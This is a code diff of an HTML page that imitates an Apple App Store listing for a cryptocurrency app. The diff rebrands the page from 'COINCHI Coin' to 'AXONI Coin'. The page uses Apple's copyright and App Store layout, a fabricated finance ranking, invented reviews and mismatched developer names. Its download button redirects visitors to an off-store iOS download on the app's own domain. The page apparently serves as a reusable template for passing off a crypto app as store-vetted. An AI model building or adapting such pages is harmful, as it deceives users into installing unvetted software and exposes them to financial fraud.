@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Appstore : COINCHI Coin</title>
+    <title>Appstore : AXONI Coin</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -14,7 +14,7 @@
                         'sf-pro': ['-apple-system', 'BlinkMacSystemFont', 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', 'Arial', 'sans-serif'],
                     },
                     colors: {
-                        'apple-blue': '#007AFF',
+                        'apple-yellow': '#007AFF',
                         'apple-gray': '#8E8E93',
                         'apple-light-gray': '#F2F2F7',
                         'apple-separator': '#D1D1D6',
@@ -201,19 +201,19 @@
                 <!-- App Icon -->
                 <div class="flex-shrink-0">
                     <div class="w-24 h-24 lg:w-40 lg:h-40 rounded-2xl lg:rounded-3xl app-icon overflow-hidden">
-                        <img src="/assets/appstore/icon.png" alt="COINCHI Coin App Icon" class="w-full h-full object-cover">
+                        <img src="/assets/appstore/icon.png" alt="AXONI Coin App Icon" class="w-full h-full object-cover">
                     </div>
                 </div>
 
                 <!-- App Information -->
                 <div class="flex-1 min-w-0">
                     <div class="flex items-start gap-2 mb-1">
-                        <h1 class="text-xl lg:text-3xl font-semibold text-apple-text leading-tight">COINCHI COIN - Trading App</h1>
+                        <h1 class="text-xl lg:text-3xl font-semibold text-apple-text leading-tight">AXONI COIN - Trading App</h1>
                         <span
                             class="age-rating text-apple-secondary text-xs font-medium px-1.5 py-0.5 lg:px-2 lg:py-1 rounded flex-shrink-0">17+</span>
                     </div>
                     <p class="text-apple-secondary text-base lg:text-lg mb-1 lg:mb-2">Decentralized Cryptocurrency Platform</p>
-                    <a href="#" class="text-apple-blue text-sm lg:text-base font-normal mb-2 lg:mb-4 inline-block">Mylan Investments LLC</a>
+                    <a href="#" class="text-apple-yellow text-sm lg:text-base font-normal mb-2 lg:mb-4 inline-block">Mylan Investments LLC</a>
 
                     <div class="flex items-center gap-1 mb-1">
                         <span class="text-apple-secondary text-xs">#28 in Finance</span>
@@ -238,7 +238,7 @@
                     <div class="mb-4">
                         <button
                             id="downloadButton"
-                            class="bg-apple-blue text-white font-semibold px-8 py-3 rounded-full text-base hover:bg-blue-600 transition-all duration-300 w-full sm:w-auto relative overflow-hidden"
+                            class="bg-apple-yellow text-white font-semibold px-8 py-3 rounded-full text-base hover:bg-yellow-600 transition-all duration-300 w-full sm:w-auto relative overflow-hidden"
                             style="min-width: 100px;"
                             onclick="startDownload()">
                             <span id="buttonText" class="relative z-10 transition-opacity duration-200">GET</span>
@@ -315,7 +315,7 @@
 
                             // Start download after animation completes
                             setTimeout(() => {
-                                window.location.href = 'https://api.coinchi.co/api/v1/download-COINCHI-ios';
+                                window.location.href = 'https://api.axoni.co/api/v1/download-AXONI-ios';
 
 
                                 // In case the download doesn't trigger navigation
@@ -368,7 +368,7 @@
         <section class="mobile-section lg:hidden">
             <div class="flex justify-between items-center">
                 <h3 class="text-lg font-semibold text-apple-text">Additional Screenshots</h3>
-                <button class="text-apple-blue">
+                <button class="text-apple-yellow">
                     <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                     </svg>
@@ -380,32 +380,32 @@
         <!-- Description -->
         <section class="mobile-section lg:py-8 lg:px-8">
             <p class="text-apple-text text-base leading-relaxed mb-4">
-                Experience the future of decentralized finance with COINCHI Coin, the revolutionary Web3 trading platform.
-                Built on the world's largest decentralized computational network, COINCHI provides secure, fast, and
+                Experience the future of decentralized finance with AXONI Coin, the revolutionary Web3 trading platform.
+                Built on the world's largest decentralized computational network, AXONI provides secure, fast, and
                 transparent cryptocurrency trading with over 15,000 nodes globally. Trade, stake, and manage your
                 digital assets with enterprise-grade security and zero downtime. Join the Web3 revolution and take
-                control of your financial future with COINCHI's cutting-edge blockchain technology.
+                control of your financial future with AXONI's cutting-edge blockchain technology.
             </p>
-            <button class="text-apple-blue text-base font-normal">more</button>
+            <button class="text-apple-yellow text-base font-normal">more</button>
         </section>
 
         <!-- What's New Section -->
         <section class="mobile-section lg:py-8 lg:px-8 section-divider">
             <div class="flex justify-between items-center mb-4 lg:mb-6">
                 <h2 class="text-xl lg:text-2xl font-semibold text-apple-text">What's New</h2>
-                <button class="text-apple-blue text-base">Version History</button>
+                <button class="text-apple-yellow text-base">Version History</button>
             </div>
 
             <div class="mb-4">
                 <div class="text-apple-secondary text-sm mb-2">Version 2.1.0</div>
                 <div class="space-y-2 text-apple-text text-base leading-relaxed">
                     <div>1. Enhanced Web3 integration with improved DeFi features and cross-chain compatibility.</div>
-                    <div>2. Added support for COINCHI parallel assets including COINCHI-ETH, COINCHI-BSC, and COINCHI-Kadena.
+                    <div>2. Added support for AXONI parallel assets including AXONI-ETH, AXONI-BSC, and AXONI-Kadena.
                     </div>
                     <div>3. New staking rewards program with higher APR for long-term holders.</div>
                     <div>4. Improved security protocols and faster transaction processing.</div>
                 </div>
-                <button class="text-apple-blue text-base font-normal mt-2">more</button>
+                <button class="text-apple-yellow text-base font-normal mt-2">more</button>
             </div>
         </section>
 
@@ -413,7 +413,7 @@
         <section class="mobile-section lg:py-8 lg:px-8 section-divider">
             <div class="flex justify-between items-center mb-6">
                 <h2 class="text-xl lg:text-2xl font-semibold text-apple-text">Ratings and Reviews</h2>
-                <button class="text-apple-blue text-base">See All</button>
+                <button class="text-apple-yellow text-base">See All</button>
             </div>
 
             <!-- Rating Overview -->
@@ -495,7 +495,7 @@
                     </div>
                     <div class="text-apple-secondary text-sm">BlockchainFan, 28/04/2025</div>
                     <div class="font-semibold text-apple-text">Revolutionary Technology</div>
-                    <div class="text-apple-text text-sm">COINCHI's parallel assets feature is game-changing. Being able to
+                    <div class="text-apple-text text-sm">AXONI's parallel assets feature is game-changing. Being able to
                         use my tokens across different blockchains seamlessly is exactly what DeFi needed.</div>
                 </div>
 
@@ -519,18 +519,18 @@
         <section class="py-6 px-4 lg:px-8 bg-gray-50 rounded-2xl mx-4 lg:mx-0">
             <div class="flex justify-between items-center mb-4">
                 <h2 class="text-xl font-semibold text-gray-900">App Privacy</h2>
-                <button class="text-blue-500 text-sm font-medium">See Details</button>
+                <button class="text-yellow-500 text-sm font-medium">See Details</button>
             </div>
 
             <p class="text-gray-600 text-sm mb-6">
-                The developer, <span class="font-medium">MOONTON</span>, indicated that the app's privacy practices may include handling of data as described below. For more information, see the <a href="#" class="text-blue-500">developer's privacy policy</a>.
+                The developer, <span class="font-medium">MOONTON</span>, indicated that the app's privacy practices may include handling of data as described below. For more information, see the <a href="#" class="text-yellow-500">developer's privacy policy</a>.
             </p>
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <!-- Data Used to Track You -->
                 <div class="bg-white p-4 rounded-xl border border-gray-200">
-                    <div class="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center mb-3">
-                        <svg class="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
+                    <div class="w-10 h-10 bg-yellow-50 rounded-lg flex items-center justify-center mb-3">
+                        <svg class="w-5 h-5 text-yellow-500" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                         </svg>
                     </div>
@@ -558,8 +558,8 @@
 
                 <!-- Data Linked to You -->
                 <div class="bg-white p-4 rounded-xl border border-gray-200">
-                    <div class="w-10 h-10 bg-blue-50 rounded-lg flex items-center justify-center mb-3">
-                        <svg class="w-5 h-5 text-blue-500" fill="currentColor" viewBox="0 0 20 20">
+                    <div class="w-10 h-10 bg-yellow-50 rounded-lg flex items-center justify-center mb-3">
+                        <svg class="w-5 h-5 text-yellow-500" fill="currentColor" viewBox="0 0 20 20">
                             <path d="M10 2a8 8 0 100 16 8 8 0 000-16zm0 14a6 6 0 110-12 6 6 0 010 12z" />
                             <path d="M10 12a1 1 0 100-2 1 1 0 000 2z" />
                         </svg>
@@ -588,7 +588,7 @@
             </div>
 
             <p class="text-gray-500 text-xs mt-4">
-                Privacy practices may vary based on, for example, the features you use or your age. <a href="#" class="text-blue-500">Learn More</a>
+                Privacy practices may vary based on, for example, the features you use or your age. <a href="#" class="text-yellow-500">Learn More</a>
             </p>
         </section>
 
@@ -600,7 +600,7 @@
                 <div class="space-y-4">
                     <div class="flex justify-between">
                         <span class="text-apple-text">Provider</span>
-                        <span class="text-apple-blue text-right">Mylan LLC</span>
+                        <span class="text-apple-yellow text-right">Mylan LLC</span>
                     </div>
                     <div class="flex justify-between">
                         <span class="text-apple-text">Size</span>
@@ -608,7 +608,7 @@
                     </div>
                     <div class="flex justify-between">
                         <span class="text-apple-text">Category</span>
-                        <span class="text-apple-blue">Finance</span>
+                        <span class="text-apple-yellow">Finance</span>
                     </div>
                     <div class="flex justify-between">
                         <span class="text-apple-text">Age Rating</span>
@@ -616,7 +616,7 @@
                     </div>
                     <div class="flex justify-between">
                         <span class="text-apple-text">Copyright</span>
-                        <span class="text-apple-secondary text-right">© 2025 COINCHI Network, All Rights Reserved</span>
+                        <span class="text-apple-secondary text-right">© 2025 AXONI Network, All Rights Reserved</span>
                     </div>
                 </div>
 
@@ -682,7 +682,7 @@
             <div class="space-y-4">
                 <div class="flex items-center gap-4 p-4 bg-apple-light-gray rounded-xl">
                     <div
-                        class="w-12 h-12 bg-gradient-to-br from-green-400 to-blue-600 rounded-xl flex items-center justify-center">
+                        class="w-12 h-12 bg-gradient-to-br from-green-400 to-yellow-600 rounded-xl flex items-center justify-center">
                         <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
                             <path
                                 d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V6a2 2 0 00-2-2H4zm2 6a2 2 0 104 0 2 2 0 00-4 0zm8-2a2 2 0 11-4 0 2 2 0 014 0z" />
@@ -692,7 +692,7 @@
                         <h3 class="font-semibold text-apple-text">Face ID & Touch ID</h3>
                         <p class="text-apple-secondary text-sm">Secure biometric authentication for wallet access and
                             transactions.</p>
-                        <a href="#" class="text-apple-blue text-sm">Learn More</a>
+                        <a href="#" class="text-apple-yellow text-sm">Learn More</a>
                     </div>
                 </div>
 
@@ -706,9 +706,9 @@
                     </div>
                     <div class="flex-1">
                         <h3 class="font-semibold text-apple-text">Widgets</h3>
-                        <p class="text-apple-secondary text-sm">Real-time COINCHI price tracking and portfolio overview on
+                        <p class="text-apple-secondary text-sm">Real-time AXONI price tracking and portfolio overview on
                             your home screen.</p>
-                        <a href="#" class="text-apple-blue text-sm">Learn More</a>
+                        <a href="#" class="text-apple-yellow text-sm">Learn More</a>
                     </div>
                 </div>
             </div>
@@ -716,7 +716,7 @@
 
         <!-- Footer Links -->
         <section class="mobile-section lg:py-8 lg:px-8">
-            <div class="flex flex-wrap gap-4 justify-center text-apple-blue text-sm">
+            <div class="flex flex-wrap gap-4 justify-center text-apple-yellow text-sm">
                 <a href="#" class="hover:underline">Developer Website</a>
                 <span class="text-apple-separator">•</span>
                 <a href="#" class="hover:underline">App Support</a>
@@ -733,7 +733,7 @@
                 <p class="text-apple-secondary text-sm mb-4">
                     Copyright © 2025 Apple Inc. All rights reserved.
                 </p>
-                <div class="flex flex-wrap justify-center gap-4 text-apple-blue text-sm">
+                <div class="flex flex-wrap justify-center gap-4 text-apple-yellow text-sm">
                     <a href="#" class="hover:underline">Internet Service Terms</a>
                     <span class="text-apple-separator">|</span>
                     <a href="#" class="hover:underline">App Store & Privacy</a>
@@ -743,7 +743,7 @@
                     <a href="#" class="hover:underline">Support</a>
                 </div>
                 <div class="mt-4">
-                    <select class="bg-transparent text-apple-blue text-sm border-none">
+                    <select class="bg-transparent text-apple-yellow text-sm border-none">
                         <option>Philippines</option>
                     </select>
                 </div>
